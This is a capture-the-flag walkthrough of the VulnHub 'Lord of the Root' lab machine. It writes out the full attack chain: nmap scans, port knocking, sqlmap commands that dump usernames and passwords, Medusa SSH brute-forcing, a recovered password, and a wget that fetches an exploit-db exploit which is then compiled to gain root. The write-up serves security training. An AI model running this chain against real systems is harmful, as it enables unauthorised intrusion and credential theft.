

İndirme Linki; https://www.vulnhub.com/entry/lord-of-the-root-101%2C129/

To find the ip address of the virtual machine after the lab setup


<code>netdiscover -i eth1 -r 192.168.56/24 </code>  
we run the above command

![1](https://user-images.githubusercontent.com/32979760/115157062-e6548b80-a08f-11eb-845a-7d17f1ce0738.PNG)

![2](https://user-images.githubusercontent.com/32979760/115157080-f66c6b00-a08f-11eb-9f61-bde36fe19ada.PNG)

When we look at the output above, we have found the ip address of the virtual machine. Now we will do an nmap scan in the next step.

<code>nmap -T5 -A -n 192.168.56.104 </code> 

we run the above command
![3](https://user-images.githubusercontent.com/32979760/115157157-5cf18900-a090-11eb-900d-553683414dcc.PNG)

As can be seen from the output, we see that the ssh service is open and we are trying to establish an ssh connection.
<code>ssh root@192.168.56.104</code>
we run the above command

![4](https://user-images.githubusercontent.com/32979760/115157220-b8bc1200-a090-11eb-83e9-e240c7105d88.PNG)

When we look at the output, a message is given that we need to perform port knocking.

Download the python tool here; https://github.com/grongor/knock

<code>./knock.py 192.168.56.104 1 2 3 </code>

we run the above command.

![5](https://user-images.githubusercontent.com/32979760/115157381-9a0a4b00-a091-11eb-89eb-efa0e17613c0.PNG)

And again we scan with nmap.


<code>nmap -T5 -sS -A -n 192.168.56.104 --top-ports 1000 </code>

we run the above command.


![6](https://user-images.githubusercontent.com/32979760/115157471-10a74880-a092-11eb-8c46-fcd3378537c4.PNG)

As can be seen in the printout, it has been seen that port 1337 is open and the website has been visited.

![7](https://user-images.githubusercontent.com/32979760/115157551-99be7f80-a092-11eb-86cd-4f44efa4fbd6.PNG)

When we visit the website, there is a photo and an inscription on it that I will take the ring to mordor.
Looking at the source code of the site, only a single line img src of the photo was seen, it was understood that we could not get anything from this page, and directory discovery was started.

<code>dirb http://192.168.56.104/1337 </code>

we run the above command.

![8](https://user-images.githubusercontent.com/32979760/115157993-ad6ae580-a094-11eb-9b54-0d622a0bab96.PNG)

and as we can see from the output, the images folder was found, the files in the images folder were checked with exiftool and binwalk, the contrast settings of the downloaded photos were changed. No results were obtained from these searches. Robots.txt, which is one of the pages to be checked in every CTF, was checked.


![9](https://user-images.githubusercontent.com/32979760/115158146-7c3ee500-a095-11eb-9b45-17909bbb7b61.PNG)

As we can see in the output above, a photo again welcomes us and we look at the source code of the page.

![10](https://user-images.githubusercontent.com/32979760/115158221-c7f18e80-a095-11eb-9922-1bc2baa26ef7.PNG)

and we found something as we will see in the output. We see it in 2 times encoded base64 format, we decode them.

![11](https://user-images.githubusercontent.com/32979760/115158353-6978e000-a096-11eb-8116-c0e53f3953b3.PNG)

we go to the directory we found in the output.


![12](https://user-images.githubusercontent.com/32979760/115158402-a04ef600-a096-11eb-9bcc-63fa18bd0910.PNG)

and the gates of mordor welcome us :) .
It is thought that there is a sql injection vulnerability on this login page and the necessary tests have been continued.
We run Burp, activate the intercept, send a post request and save the request here.

![14](https://user-images.githubusercontent.com/32979760/115158581-882ba680-a097-11eb-8cf1-bb82d49f2071.PNG)

After saving the request here, we open it with the text editor.

![15](https://user-images.githubusercontent.com/32979760/115158650-dc368b00-a097-11eb-8b65-d93c208f224c.PNG)

As you can see, the * character has been added to the end of the usertest text. For this burp, it is specified where the post request and payloads are sent.

<code>sqlmap -r burpresult.txt(dosya adımız) --technique T --dbms mysql --dbs </code>

We run the command and see that the vulnerability exists and start pulling database names.


![16](https://user-images.githubusercontent.com/32979760/115159382-8bc12c80-a09b-11eb-8a64-90496a8f0fc8.PNG)

Looking at the database names, it is obvious that the information of the database named Webapp will be retrieved.

<code>sqlmap -r burpresult.txt --dbms mysql --technique T --tables -D Webapp </code>

![17](https://user-images.githubusercontent.com/32979760/115159498-12760980-a09c-11eb-9987-4817fbe2b799.PNG)
![18](https://user-images.githubusercontent.com/32979760/115159528-376a7c80-a09c-11eb-87ed-046d6005935c.PNG)

Let's start pulling the columns in the Users table, which is the only table, but first, let's learn the column names to pull the data in the column.

<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users --columns</code>
![19](https://user-images.githubusercontent.com/32979760/115159674-ffb00480-a09c-11eb-9055-972398caaeff.PNG)

Since there are username and password columns we need here, we start pulling the data there.

<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users -C username --dump </code>
  
![20](https://user-images.githubusercontent.com/32979760/115159839-c75cf600-a09d-11eb-9e06-8a69ee243808.PNG)

We pulled the username information, now let's pull the password information.

<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users -C password --dump </code>

![21](https://user-images.githubusercontent.com/32979760/115159999-929d6e80-a09e-11eb-9f45-0d6a1eaf7c8c.PNG)

We write these user names and passwords to a text file.
![22](https://user-images.githubusercontent.com/32979760/115160052-d98b6400-a09e-11eb-9f03-4bd0fe7f4c3a.PNG)
![23](https://user-images.githubusercontent.com/32979760/115160053-da23fa80-a09e-11eb-98e5-cd5a4f84eb3e.PNG)

Since we do not know which user is authorized to connect via ssh, we will brute force the ssh service with medusa.
<code>medusa -h 192.168.56.104 -U users -P passwords -M ssh </code>

![24](https://user-images.githubusercontent.com/32979760/115160119-3a1aa100-a09f-11eb-8c9b-3f8abd14638d.PNG)

Our brute force attack yielded results and we found the username and password, now we make an ssh connection with this information.

<code>ssh smeagol@192.168.56.104 </code>

After that, we are asked for the password and we enter the password </code>MyPreciousR00t</code> here and we fall into the shell. After the shell is dropped, we type whoami and see who we are.

![25](https://user-images.githubusercontent.com/32979760/115160219-c036e780-a09f-11eb-8ae2-27af12ec2a03.PNG)

We see that we are not root and we need to investigate whether there are exploits to raise rights on this system. First, we run the following command and see the system information and version.


<code>uname -a </code>


![26](https://user-images.githubusercontent.com/32979760/115160265-1146db80-a0a0-11eb-9ed2-0ab8b78122dd.PNG)

We type the system information into the google search engine and search for exploits.

![27](https://user-images.githubusercontent.com/32979760/115160327-566b0d80-a0a0-11eb-9b1c-56b20cb80cab.PNG)

Here we come across 2 exploits, we try the first of them.

<code>wget https://www.exploit-db.com/download/39166 </code>

![28](https://user-images.githubusercontent.com/32979760/115160393-96ca8b80-a0a0-11eb-9a34-9113ee773e1d.PNG)

Then, as shown in the screen shoot below, we enter the commands in order and compile and run our C code.

![29](https://user-images.githubusercontent.com/32979760/115160459-e14c0800-a0a0-11eb-813a-8095214fa1cb.PNG)

When we type whoami, we see that we are root.

![30](https://user-images.githubusercontent.com/32979760/115160497-22441c80-a0a1-11eb-815d-f1079700c1aa.PNG)

and we go to the root directory and read the Flag.txt in it and end the CTF here.

Thank you for reading.






